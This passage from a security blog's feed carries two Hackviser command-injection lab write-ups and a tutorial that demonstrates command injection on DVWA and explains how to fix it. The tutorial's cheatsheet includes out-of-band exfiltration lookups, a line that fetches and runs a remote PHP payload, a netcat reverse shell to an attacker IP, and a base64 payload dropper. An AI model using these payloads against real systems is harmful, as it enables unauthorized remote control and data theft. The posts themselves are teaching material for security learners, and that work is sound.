srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-lg.png 1024w\"></figure>\n<p>Now, we need to manipulate a payload to test Blind Command Injection on the website. To do this, we use backquotes <code>`</code> to bypass the blacklisted keyword. Inside the backquote, we use the <code>hostname</code> command to identify the hostname of the machine.</p>\n<p>Payload:</p>\n<pre class=\"language-bash line-numbers\"><code>`hostname`.ezh05yiz9aqt010ugvzaq9dt7kdb12pr.oastify.com</code></pre>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection6.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1266\" height=\"898\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-lg.png 1024w\"></figure>\n<p>Our persistence paid off, and the payload executed. However, the output only showed DNS information. Suspecting Blind Command Injection, I went back to the BurpSuite Collaborator tab and clicked the \"<strong>Poll now</strong>\" button to check for a response from the challenge machine.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection7.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1376\" height=\"849\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-lg.png 1024w\"></figure>\n<p>In the response, a subdomain appeared, indicating the output of the hostname command. I copied this information before the \"<code>.</code>\", and that was our machine challenge answer.</p>\n<p>Answer:</p>\n<pre class=\"language-bash line-numbers\"><code>LEgeNd</code></pre>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection8.png\" alt=\"Hackviser - Command Injection Filter Bypass\" width=\"1334\" height=\"410\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-lg.png 1024w\"></figure>\n<p>Hooray! We successfully navigated the Command Injection Filter Bypass challenge on Hackviser.</p>\n<h2>Conclusion:</h2>\n<p>This lab journey illuminated the nuances of Command Injection vulnerabilities, highlighting the critical importance of input validation and bypass techniques. As we navigated through the challenge on Hackviser, encountering obstacles such as blacklisted keywords and blind injection, we honed our skills in crafting payloads and leveraging tools like BurpSuite Pro. Despite setbacks, persistence paid off as we uncovered the elusive hostname address through collaborative efforts. This experience underscores the necessity for robust security practices in web development and the value of continuous learning in fortifying against cyber threats. With each challenge conquered, we strengthen our defenses and advance our expertise in securing digital landscapes. Congratulations on overcoming the Command Injection Filter Bypass challenge on Hackviser!</p>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/25/Hackviser-Command-Injection-Filter-Bypass.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "OWASP 10",
                   "Hackviser",
                   "Command Injection",
                   "CTF Writeups"
            ],
            "date_published": "2024-02-29T15:49:44+06:00",
            "date_modified": "2024-02-29T17:13:36+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/hackviser-basic-command-injection-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/hackviser-basic-command-injection-writeup.html",
            "title": "Hackviser - Basic Command Injection Writeup",
            "summary": "Basic Command Injection - This lab exposes a Command Injection vulnerability, allowing for remote command execution. The web application takes the desired domain name as&hellip;",
            "content_html": "<div class=\"MuiBox-root css-lxebfo\">\n<div class=\"cl-preview-section\">\n<p><strong>Basic Command Injection -</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<p>This lab exposes a Command Injection vulnerability, allowing for remote command execution.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p>The web application takes the desired domain name as a parameter for the “nslookup” utility in the terminal. Your task is to execute a command on the system.</p>\n</div>\n<div class=\"cl-preview-section\">\n<p><strong>What’s the hostname address of the server hosting the website?</strong></p>\n</div>\n<div class=\"cl-preview-section\">\n<h3>What is OS Command Injection?</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>OS Command Injection represents a vulnerability wherein attackers can run arbitrary commands on the underlying operating system by manipulating user-provided input passed to system shell commands. This vulnerability emerges when web applications directly integrate user input into command strings sans adequate validation or sanitization.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3>Impact of OS Command Injection</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>OS Command Injection can result in severe consequences, including unauthorized access, data theft, or complete control over the target system. Attackers exploit this vulnerability to execute commands using the vulnerable application’s privileges, posing significant threats to system security and integrity.</p>\n<p>Read more: <a href=\"https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice\" title=\"Exploring OS Command Injection: Understanding and Hands-On Practice\">Exploring OS Command Injection: Understanding and Hands-On Practice</a></p>\n</div>\n</div>\n<div class=\"MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr\">\n<div class=\"MuiCollapse-wrapper MuiCollapse-vertical css-hboir5\">\n<div class=\"MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb\">\n<div class=\"MuiBox-root css-1c8mvc2\">\n<div class=\"MuiBox-root css-1v8my8o\">\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/24/hackviser_command_injection_lab1.0.png\" alt=\"Hackviser - Basic Command Injection Writeup\" width=\"1387\" height=\"421\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-lg.png 1024w\"></figure>\n<p>In this challenge, we’re given a parameter where we can input a URL for scanning. Behind the scenes, it utilizes <strong><span style=\"text-decoration: underline;\">nslookup</span></strong> to gather information about the entered domain.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/24/hackviser_command_injection_lab1.2.png\" alt=\"Hackviser - Basic Command Injection Writeup\" width=\"1917\" height=\"870\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-lg.png 1024w\"></figure>\n<div class=\"cl-preview-section\">\n<p>To execute command injection, I simply used a semicolon to append a Linux command alongside the input URL. In this challenge, we need to discover the hostname of the server. Therefore, my payload was:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>sak.com; hostname</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>The payload succeeded, yielding the hostname “<strong>squirrel</strong>.”</p>\n</div>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/24/hackviser_command_injection_lab1.1.png\" alt=\"Hackviser - Basic Command Injection Writeup\" width=\"1917\" height=\"1006\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-lg.png 1024w\"></figure>\n<div class=\"cl-preview-section\">\n<h3>Conclusion:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>Command Injection vulnerabilities, such as the one demonstrated in this lab, underscore the critical importance of input validation and sanitization in web application development. Failure to properly handle user input can open the door to malicious exploitation, potentially leading to serious security breaches and compromise of sensitive systems. It’s imperative for developers to implement robust security measures, including input validation and segregation of commands, to mitigate the risks associated with Command Injection attacks.</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/24/Hackviser-Basic-Command-Injection-Writeup-2.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "OWASP 10",
                   "Hackviser",
                   "Command Injection",
                   "CTF Writeups"
            ],
            "date_published": "2024-02-22T04:44:10+06:00",
            "date_modified": "2024-02-29T17:13:47+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html",
            "url": "https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice.html",
            "title": "Exploring OS Command Injection: Understanding and Hands-On Practice",
            "summary": "Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll&hellip;",
            "content_html": "<div class=\"cl-preview-section\">\n<p>Welcome to a comprehensive guide on OS Command Injection, a critical security concern for any web application handling user input. In this blog post, we’ll delve into the intricacies of OS Command Injection, providing both theoretical insights and practical demonstrations to equip pentesters and bug hunters with the knowledge and skills needed to identify and mitigate this vulnerability effectively. Let’s dive in!</p>\n</div>\n<div class=\"cl-preview-section\">\n<h2 id=\"part-1-understanding-os-command-injection\">Part 1: Understanding OS Command Injection</h2>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"what-is-os-command-injection\"><figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal); outline: 3px solid rgba(var(--color-primary-rgb), 0.55) !important;\" src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"597\" height=\"313\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice10-lg.png 1024w\"></figure></h3>\n<h3>What is OS Command Injection?</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>OS Command Injection is a type of vulnerability where attackers can execute arbitrary commands on the underlying operating system by manipulating user-supplied input that is passed to system shell commands. This vulnerability arises when web applications incorporate user input directly into command strings without proper validation or sanitization.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"impact-of-os-command-injection\">Impact of OS Command Injection</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>The consequences of OS Command Injection can be severe, potentially leading to unauthorized access, data exfiltration, or even full control over the target system. Attackers can leverage this vulnerability to execute commands with the privileges of the vulnerable application, posing significant risks to the security and integrity of the system.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"distinguishing-os-command-injection-from-other-injection-attacks\">Distinguishing OS Command Injection from Other Injection Attacks</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>It’s essential to differentiate OS Command Injection from other injection attacks, such as Code Injection. While Code Injection involves injecting and executing arbitrary code within the application context, OS Command Injection focuses on manipulating system commands executed by the underlying operating system.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"real-world-examples\">Real-World Examples</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>We explore real-world instances of OS Command Injection vulnerabilities, including notable cases like CVE-2021-25296 in NagiosXI and CVE-2023-29084 in ManageEngine ADManagerPlus. These examples underscore the critical importance of identifying and addressing OS Command Injection vulnerabilities to mitigate security risks.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"preventive-measures\">Preventive Measures</h3>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"525\" height=\"246\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice11-lg.png 1024w\"></figure>\n</div>\n<div class=\"cl-preview-section\">\n<p>Effective prevention of OS Command Injection involves implementing robust input validation, avoiding direct invocation of system shell commands whenever possible, and utilizing safe APIs for handling user input. We discuss various preventive strategies and highlight the importance of proactive security measures in mitigating this vulnerability.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"command-injection-cheatsheet\">Command Injection Cheatsheet</h3>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>--------------------------------------------------------------------\nSpecial Characters\n&amp;\n;\nNewline (0x0a or \\n)\n&amp;&amp;\n|\n||\ncommand `\n$(command )\n--------------------------------------------------------------------\nUseful Commands: Linux\nwhoami\nifconfig\nls\nuname -a\n--------------------------------------------------------------------\nUseful Commands: Windows\nwhoami\nipconfig\ndir\nver\n--------------------------------------------------------------------\nBoth Unix and Windows supported\nls||id; ls ||id; ls|| id; ls || id \nls|id; ls |id; ls| id; ls | id \nls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id \nls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id \nls %0A id\n--------------------------------------------------------------------\nTime Delay Commands\n&amp; ping -c 10 127.0.0.1 &amp;\n--------------------------------------------------------------------\nRedirecting output\n&amp; whoami &gt; /var/www/images/output.txt &amp;\n--------------------------------------------------------------------\nOOB (Out Of Band) Exploitation\n&amp; nslookup attacker-server.com &amp;\n&amp; nslookup `whoami`.attacker-server.com &amp;\n-------------------------------------------------------------------\nWAF bypasses\nvuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O \n/tmp/reverse.php %0a php /tmp/reverse.php\nvuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;\nvuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload\n--------------------------------------------------------------------</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<div class=\"cl-preview-section\">\n<h2 id=\"part-2-hands-on-practical-demonstration\">Part 2: Hands-On Practical Demonstration</h2>\n</div>\n<div class=\"cl-preview-section\">\n<p>In this section, we do a hands-on lab solutions to demonstrate OS Command Injection techniques and detection methods. Pentesters and bug hunters can gain valuable insights into identifying and exploiting OS Command Injection vulnerabilities using practical scenarios.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"616\" height=\"589\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice1-lg.png 1024w\"></figure>\n<p>In this blog post, we'll explore Command Injection Vulnerabilities using DVWA version 1.10 as our playground. I've structured our exploration into two distinct phases: Attack and Securing The Code. You might wonder why I've started with the attack phase first. Well, since we have access to the source code from the beginning (assuming this is white-box testing), it makes sense to dive straight into demonstrating the attack. Later, we'll dissect the source code to understand its workings and discuss preventive measures. Let's begin by exploring the attack phase.</p>\n<h2 id=\"attack-phase\">1. Attack Phase:</h2>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"616\" height=\"591\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice2-lg.png 1024w\"></figure>\n<p>In the Command Injection tab, the system prompts the user for input and specifically requests an IP address to be entered into the designated form field. This input mechanism serves as the entry point for potential exploitation through Command Injection.</p>\n<h3 id=\"e04b\" class=\"pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj\">Command Injection: Low</h3>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"385\" height=\"319\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice3-lg.png 1024w\"></figure>\n<p>From the provided source code snippet, it's evident that the system lacks proper input validation. This means users can input any arbitrary integer or character instead of an actual IP Address. This oversight opens up the system to exploitation, as attackers can utilize various operators, also known as meta-characters, to deceive the shell into executing arbitrary commands.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"982\" height=\"939\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice16-lg.png 1024w\"></figure>\n<p>Once the shell executes <code>1.1.1.1;</code>, it proceeds to execute <code>pwd</code> as if it were part of the same shell command. This behavior occurs because the shell interprets the entire input string as a single command.</p>\n<h3 id=\"8d7c\" class=\"pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj\">Command Injection: Medium</h3>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"539\" height=\"422\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice5-lg.png 1024w\"></figure>\n<p>In the provided source code snippet, you can input a random integer or any character instead of the expected IP Address. Unfortunately, the system fails to validate user input, allowing anything to be entered. Additionally, the system substitutes the characters <code>&amp;</code> and <code>;</code>, replacing them with blanks in the array through a substitution function. However, you can still employ other operators, known as meta-characters, to deceive the shell into executing arbitrary commands.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"983\" height=\"941\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice15-lg.png 1024w\"></figure>\n<p>Once the shell executes <code>1.1.1.1 &amp;</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 &amp;</code> as part of a single command. Consequently, the shell believes there is another command pending execution, and <code>pwd</code> is executed accordingly.</p>\n<h3 id=\"e69d\" class=\"pg nz gr be oa ph pi dx oe pj pk dz oi nl pl pm pn np po pp pq nt pr ps pt pu bj\">Command Injection: High</h3>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"546\" height=\"519\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice7-lg.png 1024w\"></figure>\n<p>In the provided source code, you can input a random integer or any character instead of the expected IP Address because the system lacks proper validation of user input. Consequently, users can input anything. Additionally, the admin has implemented a trim function to remove any extra spaces in the first array [0] and the last array[∞].</p>\n<p>Moreover, the system substitutes several characters, triggering a substitutions function that replaces the character with a blank in the array when inputted. However, users can only use two operators, also known as meta-characters, to manipulate the shell into executing arbitrary commands. Specifically, users can utilize <code>|</code> without any space afterward, as the system will replace <code>|</code> if extra space is used. Similarly, users can employ <code>||</code>  for this purpose.</p>\n<p><strong>But how does it work when the operator is supposedly filtered?</strong></p>\n<p>When you input <code>1.1.1.1 || pwd</code>, the additional <code>||</code> is replaced with a blank in the array. Consequently, the final payload appears as <code>1.1.1.1 || pwd</code>.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"983\" height=\"943\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice17-lg.png 1024w\"></figure>\n<p>After the shell executes <code>1.1.1.1 ||</code>, it proceeds to execute <code>pwd</code> afterward because the shell interprets <code>1.1.1.1 ||</code> as part of a single command. Therefore, the shell believes there is another command pending execution, leading to the execution of <code>pwd</code>.</p>\n<h3 id=\"c63b\" class=\"ny nz gr be oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bj\">2. Securing The Code</h3>\n<p>To enhance the security of this Command Injection Code, there are two crucial steps you can take:</p>\n<ol>\n<li><strong>Escaping Shell Arguments</strong></li>\n</ol>\n<p>In each level of source code complexity, the <code>shell_exec()</code> PHP function is utilized without incorporating the <code>escapeshellarg()</code> function. This practice should be rectified to bolster security measures.</p>\n<figure class=\"post__image\"><img decoding=\"async\" loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/23/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9.png\" alt=\"Exploring OS Command Injection: Understanding and Hands-On Practice\" width=\"720\" height=\"388\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/23/responsive/Exploring-OS-Command-Injection-Understanding-and-Hands-On-Practice9-lg.png 1024w\"></figure>\n<p>By implementing <code>escapeshellarg()</code>, every meta-character within a string is automatically escaped, and the string itself is encapsulated within quotes. This ensures that the string can be safely passed directly to the shell, where it will be treated as a single, secure argument.</p>\n<pre 